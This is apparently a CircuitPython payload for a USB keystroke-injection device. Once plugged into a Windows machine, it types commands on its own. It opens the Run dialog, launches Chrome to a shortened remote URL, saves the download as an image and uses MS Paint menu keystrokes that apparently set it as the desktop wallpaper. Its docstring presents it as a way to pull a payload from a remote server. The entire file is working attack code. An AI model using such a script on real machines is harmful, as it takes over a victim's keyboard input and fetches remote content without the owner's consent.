'''
This payload is intended to download a payload from a remote server through the 
windows run command. This file can be a secondary payload.
'''


import time
import usb_hid
import os


from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS


keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(keyboard)


time.sleep(10)
keyboard.send(Keycode.WINDOWS, Keycode.R)


time.sleep(2)
layout.write("chrome.exe https://tinyurl.com/2p8ab6wd\n")

time.sleep(6)
keyboard.send(Keycode.CONTROL, Keycode.S)

time.sleep(2)
layout.write("%userprofile%\downloads\mudkips.jpg")

time.sleep(1)
keyboard.send(Keycode.ENTER)

time.sleep(2)
keyboard.send(Keycode.CONTROL, Keycode.W)

time.sleep(2)
keyboard.send(Keycode.WINDOWS, Keycode.R)

time.sleep(2)
layout.write("mspaint\n")

time.sleep(4)
keyboard.send(Keycode.CONTROL, Keycode.O)

time.sleep(2)
layout.write("%userprofile%\downloads\mudkips.jpg")

time.sleep(1)
keyboard.send(Keycode.ENTER)

time.sleep(2)
keyboard.send(Keycode.ALT, Keycode.F)


time.sleep(2)
layout.write("k")

time.sleep(1)
layout.write("f")

time.sleep(2)
keyboard.send(Keycode.ALT, Keycode.F)

time.sleep(1)
layout.write("x")



